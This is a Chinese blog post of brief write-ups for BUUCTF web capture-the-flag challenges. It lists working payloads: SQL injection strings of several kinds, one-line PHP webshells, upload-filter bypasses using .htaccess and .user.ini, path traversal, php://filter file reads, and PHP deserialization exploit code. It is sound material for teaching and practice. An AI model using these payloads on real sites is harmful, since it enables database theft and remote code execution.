@@ -1,0 +1,203 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#fbfaf7">
+<script src="/js/theme.js"></script>
+<title>BUUCTF WEB入门题小记 — undefined / imiab</title>
+<meta name="description" content="[极客大挑战 2019]EasySQL 使用 1&amp;#39; or &amp;#39;1&amp;#39; = &amp;#39;1&amp;#39; #绕过sql 注意sql中的等于是=，不等于是&amp;lt;&amp;gt;或!= [极客大挑战 2019]Havefun 在源代码中的注释中找到提示 用$cat=dog获得flag [HCTF ">
+<link rel="canonical" href="https://imi-imiab.com/posts/cnblogs-18875060/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF WEB入门题小记">
+<meta property="og:description" content="[极客大挑战 2019]EasySQL 使用 1&amp;#39; or &amp;#39;1&amp;#39; = &amp;#39;1&amp;#39; #绕过sql 注意sql中的等于是=，不等于是&amp;lt;&amp;gt;或!= [极客大挑战 2019]Havefun 在源代码中的注释中找到提示 用$cat=dog获得flag [HCTF ">
+<meta property="og:url" content="https://imi-imiab.com/posts/cnblogs-18875060/">
+<meta property="og:site_name" content="undefined">
+<link rel="stylesheet" href="/css/noise.css">
+<link rel="stylesheet" href="/css/fragments.css">
+<link rel="stylesheet" href="/css/appearance.css">
+<link rel="alternate" type="application/atom+xml" title="undefined · RSS" href="/atom.xml">
+<link rel="icon" href="/favicon.svg?v=circuit-1" type="image/svg+xml">
+<meta name="generator" content="Hexo 8.1.2"></head>
+<body class="is-post">
+<div class="print-surround" aria-hidden="true">
+  <div class="print-rail print-rail-left"><img src="/images/edge-left.svg" alt="" width="260" height="1100"><span class="rail-echo rail-echo-left">修復<br>記録<br>未定</span></div>
+  <div class="print-rail print-rail-right"><img src="/images/edge-right.svg" alt="" width="260" height="1100"><span class="rail-echo">観測<br>記録<br>修復</span><span class="rail-foot">FIG. 02 / SIGNAL &amp; NOISE<br>+ &nbsp; + &nbsp; + &nbsp; +</span></div>
+</div>
+<a class="skip-link" href="#main">跳到正文</a>
+<div class="reading-progress" aria-hidden="true"></div>
+<div class="site-shell">
+<header class="site-header">
+<div class="utility-bar"><span><b>IMIAB’S JOURNAL</b> <span aria-hidden="true"> &nbsp; / &nbsp; EST. 2025</span></span><div class="header-actions"><label class="theme-control" hidden><span class="theme-symbol" aria-hidden="true"></span><span class="sr-only">外观主题</span><select id="theme-mode"><option value="system">跟随系统</option><option value="light">浅色模式</option><option value="dark">深色模式</option></select></label><button class="search-trigger" data-search-open aria-haspopup="dialog"><span class="search-icon" aria-hidden="true"></span>搜索文章 <kbd>⌘ / Ctrl K</kbd></button></div></div>
+<div class="masthead"><a class="wordmark" href="/" aria-label="undefined 首页">undef<span>i</span>ned<span class="wordmark-dot">.</span></a><div class="masthead-colophon"><span class="colophon-symbol" aria-hidden="true">※</span><span>CTF / PWN / REVERSE<br>技术、解题与未完的记录</span></div></div>
+<nav class="site-nav" aria-label="主导航">
+<div class="nav-links"><a class="" href="/" ><span>01</span> 首页</a><a class="" href="/archives/" ><span>02</span> 文章归档</a><a class="" href="/tags/"><span>03</span> 标签索引</a><a class="" href="/about/"><span>04</span> 关于我</a><a class="" href="/friends/" ><span>05</span> 友链</a></div>
+<span class="nav-status" aria-hidden="true"><i></i> 14 RECORDS</span>
+</nav>
+</header>
+<main id="main"><article class="post"><header class="post-header"><a class="post-back" href="/archives/">← 返回文章归档</a><div class="post-kicker"><span class="eyebrow">FIELD NOTES / Web</span><span class="eyebrow">7 MIN READ</span></div><h1>BUUCTF WEB入门题小记</h1><div class="post-meta"><span>BY <b>imiab</b></span><time datetime="2025-05-13T07:05:00.000Z">2025.05.13</time></div><div class="post-tags"><a href="/tags/CTF/"># CTF</a><a href="/tags/Web/"># Web</a></div></header><div class="post-grid"><div class="post-body"><div class="prose" id="post-content"><h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h1><p>使用 <code>1&#39; or &#39;1&#39; = &#39;1&#39; #</code>绕过sql</p>
+<p>注意sql中的等于是=，不等于是&lt;&gt;或!=</p>
+<h1 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h1><p>在源代码中的注释中找到提示</p>
+<p>用$cat=dog获得flag</p>
+<h1 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h1><p>在源代码中的注释找到提示</p>
+<p>进入source.php，审计代码后</p>
+<p>用file=hint.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffflllaaaggg获得flag</p>
+<h1 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h1><p>“php:&#x2F;&#x2F;“ 伪协议的条件：</p>
+<ul>
+<li>allow_url_fopen:off&#x2F;on。</li>
+<li>allow_url_include:off&#x2F;on（php:&#x2F;&#x2F;input、php:&#x2F;&#x2F;stdin、php:&#x2F;&#x2F;memory、php:&#x2F;&#x2F;temp 伪协议需要 on）。</li>
+</ul>
+<p>这里着重介绍以下 “php:&#x2F;&#x2F;“ 伪协议中的 “php:&#x2F;&#x2F;filter”伪协议。</p>
+<p>php:&#x2F;&#x2F;filter 是 PHP 中的一种特殊的伪协议，它允许对数据进行过滤处理。它可以通过输入流或输出流来操作数据，常用于对文件、数据流等进行编码、解码、压缩等处理。</p>
+<p>主要用途：</p>
+<p>对文件内容进行转换，如 base64 编码、ROT13 加密、字符串大小写转换等。<br>对 HTTP 请求的输入或输出流进行过滤。<br>基本的语法：</p>
+<ul>
+<li>php:&#x2F;&#x2F;filter&#x2F;read=&lt;过滤器列表&gt;&#x2F;resource=&lt;操作目标&gt;</li>
+</ul>
+<p>之类的东西，然后就可以将php当作文本打开并输出，并从其中的注释获得flag</p>
+<p>&#x2F;?file=php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf8.utf16&#x2F;resource=flag.php</p>
+<p>比如这样↑</p>
+<h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p>空格绕过的几种方式：&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等。</p>
+<p>反引号``会被优先执行，并被重新加载到指令里继续执行</p>
+<p>如果用<code>ls</code>需要到f12里找flag</p>
+<h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><p>没有过滤;</p>
+<p>配合show databases和show tables堆叠注入可以泄露信息</p>
+<p>可以用字典+bp看哪些关键字被过滤</p>
+<p>看别人wp发现使用*,1或者修改一个mode可以获得flag</p>
+<p><code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p>
+<p>就是把 || 设置成了 concat函数</p>
+<p>后端代码$sql = “select “.$post[‘query’].”||flag from Flag”;</p>
+<p>上面那句执行是：</p>
+<p>select concat(1,flag) from Flag</p>
+<h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><p>1’ union select 1,schema_name FROM information_schema.schemata #</p>
+<p>通过特殊表<code>information_schema</code>（储存有关数据库信息的表）查询更多信息</p>
+<p>相关连接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Chary/p/17940824">https://www.cnblogs.com/Chary/p/17940824</a></p>
+<p>database() schema() current_schema() 返回当前的数据库名字</p>
+<p>构造联合注入获得flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=database();# </span><br><span class="line"># group_concat()可以将查询到的所有字段名连接在一块</span><br><span class="line">1&#x27; union select 1,group_concat(column_name),2 from information_schema.columns where table_schema=database() and table_name=&#x27;l0ve1ysq1&#x27;#</span><br><span class="line"># 最后查询表内数据</span><br><span class="line">1&#x27; union select 1,2,group_concat(username,&#x27;~&#x27;,password) from l0ve1ysq1</span><br></pre></td></tr></table></figure>
+
+<h1 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h1><p>用bp抓包，一路跟到secret</p>
+<p>secret里面有个file读，并提示flag在flag.php里</p>
+<p>用php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf8.utf16&#x2F;resource=flag.php获得flag</p>
+<h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><p>1, union selec&#x2F;**&#x2F;t schema_name from information.schemata#</p>
+<p>发现.被过滤，但是没有过滤;</p>
+<p>用堆叠注入</p>
+<p>1’;show tables;#</p>
+<p>1’;show columns from <code>1919810931114514</code>;#</p>
+<p>注意这里是反引号而不是单引号，因为其中内容是数字而非字符串</p>
+<p>1’ and extractvalue(0x0a,concat(0x0a,(database())))</p>
+<p>extractvalue是mysql的处理函数，作用是从xml字符串中提取符合XPath的值</p>
+<p>在这里我们传入错误的xml字符串，mysql就会报错把database全部返回给我们（有详细错误输出的情况下）</p>
+<p>发现不是mysql，是supersqli</p>
+<p>1’;SET @a=concat(“sel”,”ect flag from <code>1919810931114514</code>“);PREPARE hello from @a;execute hello;#</p>
+<p>利用set @a加上concat字符拼接的形式，成功绕过并输出flag</p>
+<p>或者用rename重命名也可以</p>
+<p>‘;alter table words rename to words1;alter table <code>1919810931114514</code> rename to words;alter table words change flag id varchar(50);#</p>
+<h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><p>dirsearch扫了个login出来，没什么用</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;border:none;cursor:default;&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;return false&quot;</span> <span class="attr">href</span>=<span class="string">&quot;Secret.php&quot;</span>&gt;</span>氛围<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在这里有一个神秘php，onclick永远false，且cursor为default，光标不会变手，且border为none没有边框</p>
+<p>所以就是被藏起来的东西，点进去以后根据要求</p>
+<p>逐步修改X-Forward-For、user-agent和referer，然后即可获得flag</p>
+<h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><p>用phtml绕过后缀名php检测</p>
+<p>用GIFa89?绕过magic检测</p>
+<p>还要修改type，然后就过了</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="built_in">eval</span>($_GET[<span class="string">&quot;cmd&quot;</span>]);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h1><p>一句话，没了</p>
+<h1 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h1><p>phtml，没了</p>
+<h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><p>SQL巩固</p>
+<p>注意两个注释后面都要加空格</p>
+<p>快速默写一下</p>
+<p>1’ union select 1,2,group_cat(schema_name) from information_schema.schemata --</p>
+<p>1’ union select 1,2,group_cat(table_name) from information_schema.tables where table_schema = database()</p>
+<p>1’ union select 1,2,group_cat(column_name) from information_schema.columns where table_schema = database() and table_name = “xxx” --</p>
+<p>union和select被数删了，双写绕过即可</p>
+<p>（实际上里面插or就行了，这样短一些）</p>
+<h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h1><p>dirsearch -x 429即可排除429正常扫描</p>
+<p>哦不还是用dirmap吧，新版dirsearch貌似硬编码禁止429</p>
+<p>然后分析flag.php和index.php，构造出满足条件的就可以了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Name</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里利用了一个Obj数不相等就会跳过wakeup的漏洞（CVE-2016-7124</p>
+<p>发生版本php5&lt;5.6.25 php7&lt;7.0.10</p>
+<p>name后面那个改成3即可</p>
+<h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛] BackupFile"></a>[ACTF2020 新生赛] BackupFile</h1><p>用dirmap扫，dirsearch一片绿，还要自己翻</p>
+<p>dirmap第一遍没扫出来，第二遍扫出来了</p>
+<p>查看bak，弱类型比较，输入?key=123结束</p>
+<h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p>进入calc.php，获得源码</p>
+<p>然后不会，说?num这里问号后面加空格就绕waf了</p>
+<p>？？？</p>
+<p>总之绕了，虽然有些过滤但是chr.chr拼一下结束了</p>
+<p>file_get_contents读文件</p>
+<p>var_dump打印对象键值对</p>
+<p>chr().chr()用数字拼字符</p>
+<h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><p>可恶啊bp以为加了内容就是post了，结果请求头get忘改害我排查了好久</p>
+<p>“404a”=404</p>
+<p>cookie里面改成1（诡异的考点）</p>
+<p>money进行了长度过滤，不能直接输入</p>
+<p>1e9或者money[]=1000000000都可以，前者长度够短，后者能通过长度过滤，比较中再转化为字符串比较，简单通过</p>
+<h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><p>第一关，只要碰撞出一个开头为1’or’加上一个非0数字即可</p>
+<p>第二关，只要碰撞出两个0e开头的md5即可</p>
+<p>AI直接给了我一个然后做完了?a=QNKCDZO&amp;b=240610708</p>
+<p>第三关，传两个数组结束</p>
+<h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><p>源码404了怎么写？</p>
+<p>但是提供了两个思路，第一个是能拿到源码，能拿到secret key，就可以伪造sessions</p>
+<p>第二个思路是unicode字符转码，用ᴬ -&gt; A -&gt; a，导致admin被覆盖</p>
+<h1 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h1><p>修改content-type就可以上传</p>
+<p>传.htaccess将jpg视作php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line"></span><br><span class="line"># 或者</span><br><span class="line"></span><br><span class="line">&lt;FilesMatch &quot;lx1&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果禁用图片可以用xdm绕过，刚好文件头是两个#被当成注释</p>
+<p>一句话禁了system，用scandir和var_dump和file_get_contents输出flag即可</p>
+<h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><p>tornado render漏洞</p>
+<p>error message输入{{20}}发现大括号没了</p>
+<p>虽然乘法被过滤了，但是{{handler.settings}}泄露secret cookie随后用hints的办法+hash成功秒杀</p>
+<h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p>简单反序列化</p>
+<p>可以用伪协议假装输入是来自文件，用?text=data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</p>
+<p>exp:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;file = <span class="string">&quot;/flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:9:&quot;/flag.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1><p>简单bypass，依旧是传两个数组加弱比较</p>
+<h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p>报错注入：1’or(extractvalue(0x0a,concat(0x0a,(database()))))#</p>
+<p>()也可以用来当空格用</p>
+<p>1’or(extractvalue(0x0a,concat(0x0a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())))))#</p>
+<p>1’or(extractvalue(0x0a,concat(0x0a,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())))))#</p>
+<p>1’or(extractvalue(0x0a,concat(0x0a,(select(group_concat(id,username,password))from(H4rDsq1)))))#</p>
+<p>1’or(extractvalue(0x0a,concat(0x0a,(select(group_concat(right(password,25)))from(H4rDsq1)))))#</p>
+<p>前两个分别是爆表名和列名，后两个是把flag读出来，因为这个函数报错长度有限制要拆成两部分</p>
+<p>H4rDsq1</p>
+<p>flag{1ef882da-6f02-4bd3-84<br>2-4bd3-8406-529a271a3eb3}</p>
+<p>flag{1ef882da-6f02-4bd3-8406-529a271a3eb3}</p>
+<h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><p>简单类型判断绕过get flag</p>
+<p>写那么长还以为有多难呢</p>
+<h1 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h1><p>考点开始重复了喵，简单upload即可</p>
+<p>用<code>&lt;script language=&#39;php&#39;&gt;@eval($_GET[&#39;a&#39;])&lt;/script&gt;</code>即可</p>
+<h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><p>不能.htaccess那就.user.ini</p>
+<p>GIF89a<br>auto_prepend_file=1.jpg</p>
+<p>然后1.jpg传马，访问那个目录下的index.php即可</p>
+<h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p>union select的时候如果传入伪造的数据</p>
+<p>会把伪造的数据也列入查询结果</p>
+<p>伪造union select 1,’admin’,md5(‘123’)然后password=123就可以了</p>
+<p>那个union确实能想出来，但是md5就有点奇怪了，看别人wp才知道，不过也算常见就是了\\</p>
+<h1 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h1><p>堆叠注入，学习一下低级方式handler的用法</p>
+<p>1’;handler FlagHere open;handler FlagHere read next; handler FlagHere close; #</p>
+<h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>抄一下别人博客里的东西</p>
+<p>说起来能不能用dirmap（试了好像不能</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">src/main/java: 这个目录一般是存放web项目的Java源文件的</span><br><span class="line">src/main/resource: 这个目录一般是存放相关的配置文件</span><br><span class="line">src/main/webapp: 这个目录一般是和web应用相关的</span><br><span class="line">webapp下的文件目录是容易出现安全问题的</span><br><span class="line">/WEB-INF/web.xml: Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则</span><br><span class="line">/WEB-INF/classes/：含了站点所有用的 class 文件(即编译后的Java文件)，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">/WEB-INF/database.properties：数据库配置文件</span><br></pre></td></tr></table></figure>
+
+<p>发现有个help.docx，但是无法下载，改成post以后能下了</p>
+<p>然后下web.xml，里面有个flagcontroller，再跟着下就把flag下出来了</p>
+<p>不知道为什么，浏览器不准我下，于是用burp直接看返回包，获得flag</p>
+<p>至此buuctf web第一页结束！大概思路精简如上，啪唧啪唧啪唧</p>
+<p>（虽然好多时候都在看别人的blog，但也算，稍微，稍微入了一点点门吧？比如说xss什么都还没写到.jpg）</p>
+<p>（但是我还没有配自己的服务器，看来还要加吧劲了.jpg）</p>
+<p>（因为内核学太累了所以摸两天，呜呜小花不要骂我）</p>
+</div><div class="source-note"><span class="eyebrow">FROM THE ARCHIVE</span><p>这篇文章迁移自我的博客园，保留最初的记录。</p><a href="https://www.cnblogs.com/undefined/p/18875060" target="_blank" rel="noopener noreferrer">阅读原文 ↗</a></div><div class="post-end"><span>/ END</span><i>✳</i><span>∷ — 00</span></div></div><aside class="post-sidebar"><div class="toc-box"><span class="eyebrow">ON THIS PAGE / 目录</span><nav aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="toc-text">[极客大挑战 2019]EasySQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun"><span class="toc-text">[极客大挑战 2019]Havefun</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HCTF-2018-WarmUp"><span class="toc-text">[HCTF 2018]WarmUp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="toc-text">[ACTF2020 新生赛]Include</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="toc-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SUCTF-2019-EasySQL"><span class="toc-text">[SUCTF 2019]EasySQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL"><span class="toc-text">[极客大挑战 2019]LoveSQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File"><span class="toc-text">[极客大挑战 2019]Secret File</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-text">[强网杯 2019]随便注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http"><span class="toc-text">[极客大挑战 2019]Http</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload"><span class="toc-text">[极客大挑战 2019]Upload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife"><span class="toc-text">[极客大挑战 2019]Knife</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload"><span class="toc-text">[ACTF2020 新生赛]Upload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL"><span class="toc-text">[极客大挑战 2019]BabySQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP"><span class="toc-text">[极客大挑战 2019]PHP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-BackupFile"><span class="toc-text">[ACTF2020 新生赛] BackupFile</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RoarCTF-2019-Easy-Calc"><span class="toc-text">[RoarCTF 2019]Easy Calc</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag"><span class="toc-text">[极客大挑战 2019]BuyFlag</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BJDCTF2020-Easy-MD5"><span class="toc-text">[BJDCTF2020]Easy MD5</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HCTF-2018-admin"><span class="toc-text">[HCTF 2018]admin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2"><span class="toc-text">[MRCTF2020]你传你🐎呢</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="toc-text">[护网杯 2018]easy_tornado</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ZJCTF-2019-NiZhuanSiWei"><span class="toc-text">[ZJCTF 